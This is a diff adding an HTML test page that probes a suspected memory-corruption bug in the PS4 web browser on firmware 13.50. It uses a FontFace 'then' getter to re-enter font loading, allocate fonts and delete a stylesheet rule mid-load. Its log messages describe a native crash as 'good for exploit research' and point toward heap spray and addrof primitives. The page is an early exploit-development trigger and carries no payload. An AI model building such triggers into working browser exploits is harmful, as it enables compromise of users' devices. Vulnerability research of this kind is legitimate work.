@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Phase 0 — OOM vs corruption probe</title>
+<style>
+body { font-family: monospace; background: #111; color: #0f0; padding: 12px; }
+#log { height: 75vh; overflow: auto; border: 1px solid #333; padding: 8px; font-size: 12px; }
+</style>
+<style id="s">
+@font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
+</style>
+</head>
+<body>
+<div id="status">probing...</div>
+<div id="log"></div>
+<script src="00-logger.js"></script>
+<script>
+// Goal: distinguish OOM (allocation loop, no dangling pointers)
+// from corruption (crash at weird PC, heap spray succeeds, addrof possible later).
+
+const ITERATIONS = 200;
+let crashPhase = 'init';
+
+function installThenHook(iterBudget) {
+    let fired = false;
+    let iter = 0;
+    Object.defineProperty(FontFace.prototype, 'then', {
+        configurable: true,
+        get() {
+            if (!fired) {
+                fired = true;
+                crashPhase = 'then-callback';
+                ps4log('then getter entered');
+                while (iter < iterBudget) {
+                    iter++;
+                    new FontFace(`f${iter}`, 'local(Helvetica)', { unicodeRange: 'U+0041' });
+                    if (iter % 50 === 0) ps4mem();
+                }
+                document.getElementById('s').sheet.deleteRule(0);
+                document.body.offsetTop;
+                crashPhase = 'then-callback-done';
+            }
+            return undefined;
+        }
+    });
+}
+
+async function probe(name, iterBudget) {
+    ps4log(`--- probe: ${name} (budget=${iterBudget}) ---`);
+    crashPhase = name;
+    installThenHook(iterBudget);
+
+    let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
+    document.fonts.add(A);
+    void A.loaded;
+
+    ps4mem();
+    try {
+        await document.fonts.load('1em x', 'AB');
+        ps4log(`${name}: load resolved normally`);
+    } catch (e) {
+        ps4log(`${name}: load threw: ${e}`);
+    }
+    ps4mem();
+    ps4log(`${name}: survived`);
+}
+
+window.onerror = (msg, src, line, col, err) => {
+    ps4log(`JS ERROR in phase=${crashPhase}: ${msg} @ ${line}:${col}`);
+    ps4status('JS error — possible corruption path', '#f80');
+    return false;
+};
+
+window.onload = async () => {
+    ps4log('OOM vs corruption probe');
+    ps4log('If PS4 shows CE-36329-3 / browser restart → native crash (good for exploit research)');
+    ps4log('If page hangs then dies with no crash → likely OOM kill');
+    ps4log('If page completes all probes → bug may need different trigger on 13.50');
+
+    // Low budget: should complete if bug is benign
+    await probe('low-budget', 10);
+    // Medium: may OOM on weak devices
+    await probe('med-budget', 100);
+    // High: stress allocation inside reentrant callback
+    await probe('high-budget', ITERATIONS);
+
+    ps4status('all probes finished without native crash', '#0f0');
+    ps4log('Next step: run same page on older FW (12.52) to compare behavior');
+};
+</script>
+</body>
+</html>
